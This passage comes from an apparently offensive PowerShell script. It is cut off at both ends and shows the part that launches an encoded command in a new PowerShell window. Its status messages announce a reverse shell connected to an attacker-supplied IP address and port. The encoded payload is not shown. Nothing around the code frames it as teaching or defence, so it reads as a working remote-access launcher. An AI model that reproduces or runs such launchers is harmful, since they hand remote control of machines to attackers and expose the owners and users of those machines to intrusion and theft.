...
"@
    ...
    # Launch in new window using encoded command
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-NoExit -WindowStyle Normal -EncodedCommand $pEncoded"
    $psi.UseShellExecute = $true
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
    
    try {
        $proc = [System.Diagnostics.Process]::Start($psi)
        Write-Host "[+] Reverse shell launched in new window!" -ForegroundColor Green
        Write-Host "[+] Connected to $($ipaddr):$($portnum)" -ForegroundColor Green
        Write-Host "[*] A new PowerShell window has opened for the reverse shell" -ForegroundColor Yellow
        Write-Host "[*] Your current terminal is free to use`n" -ForegroundColor Yellow
    }
    catch {
        Write-Host "[!] Could not launch new window: $_" -ForegroundColor Red
